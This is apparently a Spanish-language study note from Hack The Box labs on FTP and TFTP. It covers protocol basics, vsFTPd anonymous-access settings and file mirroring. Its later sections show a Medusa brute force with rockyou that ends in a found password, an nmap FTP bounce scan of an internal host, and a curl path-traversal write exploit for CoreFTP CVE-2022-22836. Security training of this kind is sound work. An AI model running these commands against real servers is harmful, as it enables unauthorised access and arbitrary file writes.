---

---
> ​El **Protocolo de Transferencia de Archivos (FTP)** es uno de los protocolos más antiguos de Internet, operando en la capa de aplicación del modelo TCP/IP, al igual que HTTP o POP. FTP permite la transferencia de archivos entre un cliente y un servidor, ofreciendo características como autenticación de usuarios y soporte para diversos comandos que facilitan la gestión de archivos y directorios. Por defecto, se encuentra en el puerto 21. 

### TFTP

Por otro lado, el **Protocolo de Transferencia de Archivos Trivial (TFTP)** es una versión simplificada de FTP. Aunque también facilita la transferencia de archivos entre procesos cliente y servidor, carece de funcionalidades avanzadas como la autenticación de usuarios y el listado de directorios. Además, mientras que FTP utiliza el protocolo TCP, TFTP opera sobre UDP, lo que lo hace menos confiable debido a la ausencia de mecanismos de control de errores integrados. ​

Debido a su simplicidad y falta de medidas de seguridad, TFTP se utiliza comúnmente en redes locales y entornos controlados donde la seguridad no es una preocupación principal. Por ejemplo, es habitual emplearlo para transferir pequeños archivos entre computadoras en una red interna.

A continuación, se presentan algunos comandos básicos de TFTP:

|Comando|Descripción|
|---|---|
|`connect`|Establece el host remoto y, opcionalmente, el puerto para las transferencias de archivos.|
|`get`|Transfiere un archivo o conjunto de archivos desde el host remoto al host local.|
|`put`|Transfiere un archivo o conjunto de archivos desde el host local al host remoto.|
|`quit`|Sale de la sesión de TFTP.|
|`status`|Muestra el estado actual de TFTP, incluyendo el modo de transferencia, estado de conexión, etc.|
|`verbose`|Activa o desactiva el modo detallado, mostrando información adicional durante la transferencia.|

Para conectarnos vía FTP a un host, es tan sencillo como esto:

```bash
ftp -p <IP>
```

Si el servidor permite autenticación anónima, pondremos como usuario `anonymous` y la contraseña no será necesaria. 
### Configuración de vsFTPd para Acceso Anónimo

El servidor vsFTPd (Very Secure FTP Daemon) permite la configuración de accesos anónimos mediante diversas directivas en su archivo de configuración (`/etc/vsftpd.conf`). A continuación, se describen algunas de las configuraciones más relevantes

|Configuración|Descripción|
|---|---|
|`anonymous_enable=YES`|¿Permitir inicio de sesión anónimo?|
|`anon_upload_enable=YES`|¿Permitir que los usuarios anónimos suban archivos?|
|`anon_mkdir_write_enable=YES`|¿Permitir que los usuarios anónimos creen nuevos directorios?|
|`no_anon_password=YES`|¿No pedir contraseña a los usuarios anónimos?|
|`anon_root=/home/usuario/ftp`|Directorio raíz para los usuarios anónimos.|
|`write_enable=YES`|¿Permitir el uso de comandos FTP: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE y SITE?|

### Descargar todos los archivos

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

Después, podemos con el comando `tree .` ver todo el contenido de forma sencilla:

```shell-session
.
└── 10.129.14.136
    ├── Calendar.pptx
    ├── Clients
    │   └── Inlanefreight
    │       ├── appointments.xlsx
    │       ├── contract.docx
    │       ├── meetings.txt
    │       └── proposal.pptx
    ├── Documents
    │   ├── appointments-template.xlsx
    │   ├── contract-template.docx
    │   └── contract-template.pdf
    ├── Employees
    └── Important Notes.txt

5 directories, 9 files
```

### Interacción con el servidor

```shell-session
amr251@htb[/htb]$ nc -nv 10.129.14.136 21
```

```shell-session
amr251@htb[/htb]$ telnet 10.129.14.136 21
```

​Cuando un servidor FTP utiliza cifrado TLS/SSL, es necesario emplear un cliente compatible con estos protocolos para establecer una conexión segura. Una herramienta útil para este propósito es `openssl`, que permite interactuar con el servidor FTP y, además, inspeccionar el certificado SSL proporcionado por el servidor.​

**Conectar a un servidor FTP con `openssl`:**

Para establecer una conexión segura y visualizar el certificado SSL del servidor FTP, puedes utilizar el siguiente comando:​

```
openssl s_client -connect [servidor_ftp]:21 -starttls ftp`
```

Donde `[servidor_ftp]` debe ser reemplazado por la dirección del servidor FTP al que deseas conectarte. Al ejecutar este comando, `openssl` mostrará detalles sobre la conexión SSL/TLS, incluyendo el certificado del servidor. Esta información puede ser útil para verificar la autenticidad del servidor y diagnosticar posibles problemas de conexión.
### Atacando FTP por fuerza bruta

Si no existe la forma de autenticación anónima, donde nos concectamos como `anonymous` sin especificar contraseña, podemos intentar iniciar sesión mediante fuerza bruta. Exixte una herramienta llamada [Medusa](https://github.com/jmk-foofus/medusa), disponible también con `sudo apt install medusa` para intentar hacer este tipo de ataque. Los flags de esta herramienta son los siguientes:

| Flag | Uso                                  |
| ---- | ------------------------------------ |
| `-u` | Especificar un usuario               |
| `-U` | Especificar una lista de usuarios    |
| `-P` | Especificar una lista de contraseñas |
| `-M` | Módulo a usar                        |
| `-h` | Especificar un host                  |
```shell-session
amr251@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

### Ataque de salto FTP

Un **ataque de rebote FTP** (_FTP bounce attack_) es un ataque de red que utiliza servidores FTP para enviar tráfico saliente hacia otro dispositivo en la red. El atacante usa un comando **PORT** para engañar a la conexión FTP y hacer que ejecute comandos y obtenga información de un dispositivo distinto al servidor previsto.

Imaginemos que estamos atacando un servidor FTP llamado **FTP_DMZ**, el cual está expuesto a Internet. Otro dispositivo dentro de la misma red, llamado **Internal_DMZ**, **no está expuesto a Internet**. Podemos usar la conexión al servidor FTP_DMZ para escanear el dispositivo Internal_DMZ usando el ataque de rebote FTP, y así obtener información sobre los puertos abiertos de ese servidor. Luego, podemos usar esa información como parte de nuestro ataque contra la infraestructura.

El flag `-b` con nmap puede usarse para realizar este tipo de ataque:

```shell-session
amr251@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

### Últimas vulnerabilidades FTP

En este caso, hablaremos de la vulnerabilidad en **CoreFTP anterior a la versión build 727**, identificada como **CVE-2022-22836**. Esta vulnerabilidad afecta a un servicio FTP que **no procesa correctamente las solicitudes HTTP PUT**, lo que da lugar a una vulnerabilidad de **travesía de directorios/rutas (directory/path traversal)** con autenticación, y a una vulnerabilidad de **escritura arbitraria de archivos**. Esta falla permite escribir archivos **fuera del directorio al que el servicio debería tener acceso**.

##### Concepto del ataque

Este servicio FTP usa solicitudes **HTTP POST** para subir archivos. Sin embargo, **CoreFTP también permite solicitudes HTTP PUT**, que pueden usarse para **escribir contenido directamente en archivos**. Vamos a ver el ataque según este concepto. El exploit para este ataque es relativamente sencillo, y se basa en un solo comando **cURL**

##### Explotación de CoreFTP

```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <usuario>:<contraseña> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Este comando crea una solicitud HTTP PUT **sin procesar** (`-X PUT`) con autenticación básica (`--basic -u <usuario>:<contraseña>`), indicando la ruta del archivo objetivo (`--path-as-is https://<IP>/../../../../../whoops`) y el contenido del archivo (`--data-binary "PoC."`). Además, se especifica la cabecera "Host" (`-H "Host: <IP>"`) con la dirección IP del sistema objetivo.
